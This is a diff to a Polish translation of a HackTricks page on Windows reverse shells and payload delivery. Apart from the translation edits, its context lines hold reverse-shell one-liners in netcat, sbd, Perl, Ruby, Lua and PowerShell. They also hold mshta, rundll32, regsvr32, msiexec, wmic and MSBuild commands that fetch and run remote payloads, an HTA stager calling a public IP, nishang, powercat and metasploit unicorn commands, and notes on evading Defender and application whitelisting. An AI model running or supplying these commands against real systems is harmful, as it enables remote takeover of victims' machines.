@@ -7,7 +7,7 @@
 Inne sposoby wsparcia HackTricks:
 
 * Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
@@ -16,7 +16,7 @@ Inne sposoby wsparcia HackTricks:
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcata**. Działa w systemach z rodziny Unix oraz Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, dostosowywanie portów źródłowych i ciągłe ponowne nawiązywanie połączenia, sbd zapewnia wszechstronne rozwiązanie do komunikacji TCP/IP. Dla użytkowników systemu Windows, wersję sbd.exe z dystrybucji Kali Linux można wykorzystać jako niezawodną zamiennik Netcata.
+**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcata**. Działa w systemach z rodziny Unix oraz Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, dostosowywanie portów źródłowych i ciągłe ponowne połączenie, sbd zapewnia wszechstronne rozwiązanie do komunikacji TCP/IP. Dla użytkowników systemu Windows, wersję sbd.exe z dystrybucji Kali Linux można używać jako niezawodną zamiennik Netcata.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -61,6 +61,8 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
+
+Lua jest językiem skryptowym, który jest często wykorzystywany do tworzenia skryptów w grach i aplikacjach. Lua jest łatwy w użyciu i oferuje wiele funkcji wbudowanych, co czyni go popularnym wyborem w świecie programowania gier. Lua może być również używany do tworzenia skryptów do automatyzacji zadań w systemach Windows.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -92,8 +94,8 @@ Proces wykonujący wywołanie sieciowe: **powershell.exe**\
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Proces wykonujący wywołanie sieciowe: **svchost.exe**\
-Ładunek zapisany na dysku: **Lokalna pamięć podręczna klienta WebDAV**
+Proces wykonujący połączenie sieciowe: **svchost.exe**\
+Payload zapisany na dysku: **Lokalna pamięć podręczna klienta WebDAV**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -117,7 +119,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Możesz bardzo łatwo pobrać i uruchomić zombi Koadic, używając stagera hta**
+**Możesz bardzo łatwo pobrać i uruchomić zombiaka Koadic, używając stagera hta**
 
 #### Przykład hta
 
@@ -182,7 +184,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Wykryto przez defendera**
+**Wykryto przez obrońcę**
 
 **Rundll32 - sct**
 
@@ -230,7 +232,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 
 #### Regsvr32 -sct
 
-[**Z tej lokalizacji**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+[**Stąd**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 ```markup
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -297,7 +299,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Wykryte przez obrońcę**
+**Wykryty przez obrońcę**
 
 ## **MSIExec**
 
@@ -314,7 +316,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-* [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Z tego miejsca](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
@@ -340,7 +342,8 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Możesz użyć tej techniki, aby ominąć białe listy aplikacji i ograniczenia Powershell.exe. Po prostu pobierz to i wykonaj: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Możesz użyć tej techniki, aby ominąć białe listy aplikacji i ograniczenia Powershell.exe. Zostaniesz poproszony o powłokę PS.\
+Po prostu pobierz to i wykonaj: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -386,13 +389,13 @@ W folderze **Shells** znajduje się wiele różnych powłok. Aby pobrać i uruch
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Zacznij serwować skrypt na serwerze sieciowym i wykonaj go po stronie ofiary:
+Rozpocznij serwowanie skryptu na serwerze sieciowym i wykonaj go po stronie ofiary:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Obrońca nie wykrywa tego jako złośliwego kodu (jeszcze, 3/04/2019).
+Defender nie wykrywa tego jako złośliwego kodu (jeszcze, 3/04/2019).
 
-**TODO: Sprawdź inne powłoki nishang**
+**TODO: Sprawdź inne shelle nishang**
 
 ### **PS-Powercat**
 
@@ -402,11 +405,9 @@ Pobierz, uruchom serwer sieciowy, uruchom nasłuchiwanie i wykonaj to na końcu 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender nie wykrywa tego jako złośliwego kodu (jeszcze, 3/04/2019).
-
 **Inne opcje oferowane przez powercat:**
 
-Powiązane powłoki, Odwrócona powłoka (TCP, UDP, DNS), Przekierowanie portu, Przesyłanie/pobieranie, Generowanie ładunków, Serwowanie plików...
+Powłoki wiążące, Odwrócona powłoka (TCP, UDP, DNS), Przekierowanie portów, Przesyłanie plików, Generowanie ładunków, Obsługa plików...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -437,15 +438,15 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Utwórz wersję powershell tylnej furtki metasploita, korzystając z narzędzia unicorn
+Utwórz wersję powershell tylnej furtki metasploit za pomocą narzędzia unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Uruchom msfconsole z utworzonym zasobem:
+Rozpocznij msfconsole z utworzonym zasobem:
 ```
 msfconsole -r unicorn.rc
 ```
-Rozpocznij serwer sieciowy obsługujący plik _powershell\_attack.txt_ i wykonaj na ofierze:
+Uruchom serwer sieciowy obsługujący plik _powershell\_attack.txt_ i wykonaj na ofierze:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -469,7 +470,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Konsola PS z kilkoma ofensywny
 ​
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
